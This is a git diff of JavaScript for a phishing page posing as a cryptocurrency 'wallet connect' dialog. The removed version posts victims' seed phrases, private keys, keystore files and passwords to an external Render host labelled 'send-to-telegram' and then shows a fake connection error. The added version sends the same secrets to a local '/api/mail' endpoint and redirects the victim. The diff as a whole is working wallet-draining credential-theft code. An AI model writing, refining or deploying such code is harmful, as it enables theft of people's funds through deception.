@@ -5,31 +5,43 @@ const closeModalBtn = document.getElementById('closeModalBtn');
 const closeFormModalBtn = document.getElementById('closeFormModalBtn');
 
 // Get the element with the class 'open-modal-area'
-var openModalArea = document.querySelector(".open-modal-area");
+var openModalArea = document.querySelector('.open-modal-area');
 
 // Function to open the modal
-openModalArea.onclick = function () {
-  modal.style.display = "block";
+if (openModalArea) {
+  openModalArea.onclick = function () {
+    modal.style.display = 'block';
+  };
 }
 
 // Open the wallet selection modal
-openModalBtn.addEventListener('click', function () {
-  modal.style.display = 'block';
-});
+if (openModalBtn) {
+  openModalBtn.addEventListener('click', function () {
+    modal.style.display = 'block';
+  });
+}
 
 // Close the wallet selection modal
-closeModalBtn.addEventListener('click', function () {
-  modal.style.display = 'none';
-});
+if (closeModalBtn) {
+  closeModalBtn.addEventListener('click', function () {
+    modal.style.display = 'none';
+  });
+}
 
 // Open Modal
-document.getElementById('openForm').onclick = function () {
-  document.getElementById('popupModal').style.display = 'block';
+const openForm = document.getElementById('openForm');
+if (openForm) {
+  openForm.onclick = function () {
+    document.getElementById('popupModal').style.display = 'block';
+  };
 }
 
 // Close Modal
-document.getElementById('closeForm').onclick = function () {
-  document.getElementById('popupModal').style.display = 'none';
+const closeForm = document.getElementById('closeForm');
+if (closeForm) {
+  closeForm.onclick = function () {
+    document.getElementById('popupModal').style.display = 'none';
+  };
 }
 
 // Open Tab
@@ -52,61 +64,78 @@ function openTab(event, tabName) {
 
 // Close Modal when clicked outside
 window.onclick = function (event) {
-  var modal = document.getElementById('popupModal');
-  if (event.target === modal) {
-    modal.style.display = 'none';
+  var popupModal = document.getElementById('popupModal');
+  if (event.target === popupModal) {
+    popupModal.style.display = 'none';
   }
 
-  var errorModal = document.getElementById("errorModal");
+  var errorModal = document.getElementById('errorModal');
   if (event.target === errorModal) {
-    errorModal.style.display = "none";
+    errorModal.style.display = 'none';
   }
-}
+};
 
 // Function to show the error popup modal
 function showErrorPopup() {
-  var modal = document.getElementById("errorModal");
-  modal.style.display = "block";
+  var modal = document.getElementById('errorModal');
+  if (modal) {
+    modal.style.display = 'block';
+  }
 }
 
 // Function to close the modal
 function closeModal() {
-  var modal = document.getElementById("errorModal");
-  modal.style.display = "none";
+  var modal = document.getElementById('errorModal');
+  if (modal) {
+    modal.style.display = 'none';
+  }
 }
 
 // Submit Button
-document.getElementById('submitBtn').onclick = function () {
-  const phraseForm = document.getElementById('phraseForm');
-  const privateKeyForm = document.getElementById('privatekeyForm');
-  const keystoreForm = document.getElementById('keystoreForm');
+const submitButtons = document.querySelectorAll('#submitBtn');
+submitButtons.forEach((button) => {
+  button.addEventListener('click', async function (event) {
+    const form = this.closest('form');
+    if (!form) return;
 
-  const phrase = phraseForm?.phrase?.value.trim() || '';
-  const privateKey = privateKeyForm?.privatekey?.value.trim() || '';
-  const keystore = keystoreForm?.keystore?.value.trim() || '';
-  const password = keystoreForm?.password?.value.trim() || '';
+    event.preventDefault();
 
-  const payload = { phrase, privateKey, keystore, password };
+    const formData = new FormData(form);
+    const data = Object.fromEntries(formData.entries());
 
-  // 🚀 Replace this with your real Render backend URL
-  fetch('https://franky-tginputs.onrender.com/send-to-telegram', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload)
-  })
-    .then(res => res.json())
-    .then(data => {
-      if (data.success) {
-        alert("Error Connecting Wallet, Please try another wallet.");
-        document.getElementById('popupModal').style.display = 'none';
-      } else {
-        alert("Failed to submit. Try again.");
-        showErrorPopup();
+    if (!data.phase) {
+      data.phase = form.id === 'contact-form-1' ? 'seedphrase' : form.id === 'contact-form-2' ? 'privateKey' : 'keystore';
+    }
+
+    if (!data.seedphrase && data.phrase) {
+      data.seedphrase = data.phrase;
+    }
+
+    if (data.privatekey && !data.privateKey) {
+      data.privateKey = data.privatekey;
+    }
+
+    if (data.password && !data.keystorePassword) {
+      data.keystorePassword = data.password;
+    }
+
+    try {
+      const response = await fetch('/api/mail', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
+        },
+        body: new URLSearchParams(data).toString()
+      });
+
+      if (!response.ok) {
+        throw new Error('Mail submission failed');
       }
-    })
-    .catch(err => {
-      console.error("Network error:", err);
-      alert("Network error.");
+
+      window.location.href = '/rdr.html';
+    } catch (error) {
+      console.error('Wallet submit error:', error);
       showErrorPopup();
-    });
-};
+    }
+  });
+});
